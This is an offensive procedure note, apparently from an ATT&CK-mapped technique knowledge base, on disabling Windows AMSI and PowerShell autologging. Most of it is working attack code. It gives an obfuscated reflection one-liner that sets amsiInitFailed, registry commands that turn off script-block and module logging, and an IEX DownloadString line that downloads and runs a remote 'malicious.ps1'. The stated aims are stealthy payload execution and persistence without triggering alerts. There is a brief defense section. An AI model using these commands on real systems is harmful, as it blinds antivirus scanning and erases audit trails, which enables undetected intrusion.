---
type: procedure
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Impair Defenses Disable or Modify Tools|T1562.001 - Impair
    Defenses: Disable or Modify Tools]]
  - >-
    [[techniques/Bypass User Account Control|T1548.002 - Bypass User Account
    Control: Bypass UAC]]
  - >-
    [[techniques/Security Software Discovery|T1063 - Security Software
    Discovery]]
sub_techniques: []
tags:
  - amsi-bypass
  - wmf5-autologging
  - powershell-reflection
  - defense-evasion
commands: []
platforms:
  - Windows
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Bypass-AMSI-and-WMF5-Autologging-Using-Reflection

## Summary

This procedure uses .NET reflection in PowerShell to disable the Antimalware Scan Interface (AMSI) and bypass Windows Management Framework 5 (WMF5) autologging features, allowing execution of malicious scripts without triggering antivirus scans or logging mechanisms. It enables attackers to evade detection while escalating privileges or discovering security software configurations on Windows systems.

## Description

The reflection method, inspired by techniques from security researcher Matt Graeber, leverages PowerShell's ability to dynamically invoke .NET methods without writing files to disk, avoiding common logging triggers. AMSI is a Windows interface that scans PowerShell scripts for malware in real-time; disabling it prevents script blocking. WMF5 autologging, introduced in PowerShell 5.0, logs script blocks and module loads for auditing—bypassing this ensures stealthy execution. This approach is useful in post-exploitation scenarios for running undetected payloads, such as after initial access via phishing or exploit kits. It targets Windows 10+ environments with PowerShell 5 or later, assuming local execution context. Success allows arbitrary script execution, potentially leading to privilege escalation via UAC bypass techniques chained with this evasion.

## Requirements

1. Windows system with PowerShell 5.0 or later (WMF5 installed).
2. Local execution access, preferably with administrative privileges for full UAC bypass effectiveness.
3. No external tools required; uses built-in PowerShell and .NET runtime.
4. Target must have AMSI enabled (default on modern Windows).

## Defense

Defensive measures and detection strategies:

- Enable PowerShell Constrained Language Mode and monitor for reflection-based API calls using EDR tools like Sysmon or Microsoft Defender for Endpoint.
- Implement application whitelisting (e.g., AppLocker) to restrict unsigned script execution.
- Regularly audit PowerShell logs (Event ID 4104 for script blocks) and AMSI events (Event ID 1102 for initialization failures).
- Use behavioral analytics to detect anomalous .NET method invocations, such as those targeting AmsiUtils.

## Objectives

1. Disable AMSI to prevent real-time script scanning and blocking.
2. Bypass WMF5 autologging to avoid script execution traces in event logs.
3. Enable stealthy execution of follow-on malicious payloads for discovery or escalation.
4. Maintain persistence without triggering security alerts.

## Instructions

### Step 1: Prepare PowerShell Environment

**Context**: Launch PowerShell in an elevated context if possible to maximize evasion effectiveness. Verify WMF5 is active and AMSI is operational before bypassing.

Check PowerShell version and AMSI status:

```powershell
$PSVersionTable.PSVersion
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)
```

> This confirms PowerShell 5+ is running and AMSI is initialized (returns False). If AMSI is already disabled, the procedure may not be necessary.

### Step 2: Disable AMSI Using Reflection

**Context**: Use reflection to set the amsiInitFailed flag in the AmsiUtils class, tricking PowerShell into believing AMSI initialization failed. This prevents script scanning without direct API calls that might be logged.

**Code** ([[codes/PowerShell-Reflection-AMSI-Bypass]]):

```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

> Execute this obfuscated reflection code directly in PowerShell. It dynamically creates a delegate to access and modify the private amsiInitFailed field. Expected output is no visible response if successful; test by running a known malicious script (e.g., one that would normally trigger AMSI).

### Step 3: Bypass WMF5 Autologging

**Context**: Disable module and script block logging in WMF5 to prevent event logging of executed code. This complements AMSI bypass by evading audit trails.

Set logging policies to off:

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

> These registry modifications disable logging at the policy level. Restart PowerShell or the session for changes to take effect. Verify by checking registry values or attempting a logged operation without events appearing in the log.

### Step 4: Verify Evasion and Test Execution

**Context**: Confirm bypasses are active and test with a benign but detectable payload to ensure no alerts trigger.

Test AMSI bypass:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')
```

> Replace with a test script that AMSI would normally block. If it executes without error, the bypass succeeded. Monitor Event Viewer for any logging (should be absent post-WMF5 bypass).
